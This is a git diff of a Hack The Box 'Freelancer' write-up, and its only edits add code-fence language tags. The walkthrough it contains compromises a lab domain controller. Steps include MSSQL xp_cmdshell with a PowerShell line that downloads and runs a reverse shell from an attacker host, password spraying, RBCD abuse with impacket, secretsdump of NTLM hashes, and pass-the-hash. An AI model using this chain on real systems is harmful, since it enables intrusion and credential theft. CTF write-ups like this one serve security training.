@@ -23,7 +23,7 @@ cover:
 
 I ran nmap quickly to find open ports using: `nmap 10.10.11.5 -T4 -vv`
 
-```
+```jsx
 PORT     STATE SERVICE          REASON
 53/tcp   open  domain           syn-ack
 80/tcp   open  http             syn-ack
@@ -41,7 +41,7 @@ PORT     STATE SERVICE          REASON
 
 With this open ports, I did agressive nmap scan using: `sudo nmap 10.10.11.5 -T4 -vv -p53,80,88,135,139,389,445,464,593,636,3268,3269 -A -sC -sV -O`
 
-```
+```jsx
 PORT     STATE SERVICE       REASON          VERSION
 53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
 80/tcp   open  http          syn-ack ttl 127 nginx 1.25.5
@@ -111,7 +111,7 @@ In this site, we can create account for employer or freelancer.
 
 I created a freelancer user with following details:
 
-```
+```bash
 --> freelancer info <--
 freelancer_rezy > username
 mail@gmail.com > email
@@ -119,7 +119,7 @@ mail@gmail.com > email
 
 I will also create a account of employeer with following details:
 
-```
+```bash
 --> employer info <---
 employercoo_l > username
 erezrrrr1@gmail.com > email
@@ -179,13 +179,13 @@ As it is Windows box, it is most likely MSSQL. So, I will use the rev shelll scr
 
 First I used to impersonate as user System Admin. ([https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users))
 
-```
+```sql
 EXECUTE AS LOGIN = 'sa'
 ```
 
 Then,
 
-```
+```sql
 sp_configure 'show advanced options', '1'
 RECONFIGURE
 sp_configure 'xp_cmdshell', '1'
@@ -200,7 +200,7 @@ I can see it is sql_svc account.
 
 Now, I ran: 
 
-```
+```sql
 EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)'
 ```
 
@@ -258,7 +258,7 @@ At Directory: `C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU`
 
 There are following files:
 
-```
+```plaintext
 Directory: C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU
 
 Mode                LastWriteTime         Length Name                                                                  
@@ -279,7 +279,7 @@ d-----        5/27/2024   1:52 PM                x64
 
 Where, `sql-Configuration.INI` file contains the following configurations:
 
-```
+```bash
 SHELL> cat sql-Configuration.INI
 [OPTIONS]
 ACTION="Install"
@@ -304,7 +304,7 @@ SQLSVCPASSWORD="IL0v3ErenY3ager"
 
 Here, `SQLSVCPASSWORD="IL0v3ErenY3ager"` is a password revealed. I will try to pass this password using crackmapexec to the users that were in users directory.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/htb/freelancer]
 └─$ crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager 
 SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
@@ -330,7 +330,7 @@ I see myself as mikasaAckerman user. And the desktop of this user contains the u
 
 In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:
 
-```
+```bash
 Hello Mikasa,
 I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
 I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
@@ -342,7 +342,7 @@ There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my li
 
 First I opened a smb server using command: `impacket-smbserver share . -smb2support -user rezy -password rezy`. And then mounted the share using:
 
-```
+```powershell
 $SharePath = "\\10.10.14.72\share"
 $Username = "rezy"
 $Password = "rezy"
@@ -356,7 +356,7 @@ net use Z: $SharePath $Password /user:$Username /persistent:no
 
 This will mount the smb share from linux to windows. Then to confirm I can do this:
 
-```
+```powershell
 PS C:\Users\mikasaAckerman\Desktop> Get-PSDrive
 
 Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
@@ -393,7 +393,7 @@ I will login to it using `evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr
 
 Now, we need to syncronize the server time. 
 
-```
+```bash
 ┌──(root㉿kali)-[/home/kali]
 └─# ntpdate -u freelancer.htb 
 2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap
@@ -402,7 +402,7 @@ CLOCK: time stepped by 17631.477286
 
 17631.477286 seconds is around 5 hours. So, I ran:
 
-```
+```bash
 ┌──(root㉿kali)-[/home/kali]
 └─# faketime -f +5h bloodhound-python -c ALL -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d freelancer.htb -ns 10.10.11.5
 INFO: Found AD domain: freelancer.htb
@@ -447,7 +447,7 @@ So we can perform Resource Based **Constrained Delegation,** Using this a Domain
 
 I will now run, 
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ impacket-addcomputer -computer-name 'HEKER$' -computer-pass 'Heker123@!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199' 
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -459,7 +459,7 @@ The `impacket-addcomputer` command is used to add a computer account to a domain
 
 Now we will use impacket rbcd to delegate:
 
-```
+```bash
 impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 ```
 
@@ -469,7 +469,7 @@ impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -acti
 - `action 'write'`: Specifies the action to be taken. In this case, it's "write", which means it will write the delegation settings.
 - `'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'`: Specifies the domain and credentials used to authenticate. In this case, it's the "freelancer.htb" domain, with the username "lorra199" and password "PWN3D#l0rr@Armessa199".
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -499,7 +499,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 Now we can see we are able to act on behalf of other identity. Now i will use impcket to get service ticket from dc.
 
-```
+```bash
 faketime -f +5h impacket-getST -spn 'cifs/dc.freelncer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/HEKER$:'Heker123@!'
 ```
 
@@ -509,13 +509,13 @@ i will now import the ticket and use secretsdump to get the hash of admin accoun
 
 To import the ticket, I will simply do `export KRB5CCNAME=Administrator.ccache` and run the following command:
 
-```
+```bash
 faketime -f +5h impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
 ```
 
 We will recieve Hash for user accounts in this DC along with Administrator’s. Now, i will simply use the hash of Administrator and pass the hash with evil-winrm to get access to root account.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290
                                         
